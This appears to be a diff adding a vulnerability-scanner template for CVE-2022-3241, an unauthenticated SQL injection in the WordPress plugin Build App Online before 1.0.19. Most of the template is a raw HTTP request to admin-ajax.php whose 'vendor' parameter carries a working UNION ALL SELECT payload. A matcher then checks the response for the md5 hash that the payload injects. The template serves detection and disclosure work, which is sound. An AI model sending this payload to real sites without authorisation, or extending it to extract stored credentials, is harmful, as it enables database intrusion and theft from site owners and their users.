@@ -1,0 +1,28 @@
+id: CVE-2022-3241
+info:
+  name: WordPress Plugin Build App Online Vendor SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress plugin Build App Online before version 1.0.19 is vulnerable to SQL Injection. Unsanitized parameters allow attackers to execute arbitrary SQL commands, potentially exposing sensitive information like account passwords.
+  reference:
+    - https://wpscan.com/vulnerability/a995dd67-43fc-4087-a7f1-5db57f4c828c
+  tags: sql
+  classification:
+    cve-id: CVE-2022-3241
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=build-app-online-vendor_reviews&vendor=-3065%20UNION%20ALL%20SELECT%209921,md5(123),9921,9921,9921,9921,9921,9921,CONCAT(0x7178787671,0x7861526f436a41565347426143717a5a6a566a5843757a78637879477970635357517456746f6d44,0x7162626b71),9921 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
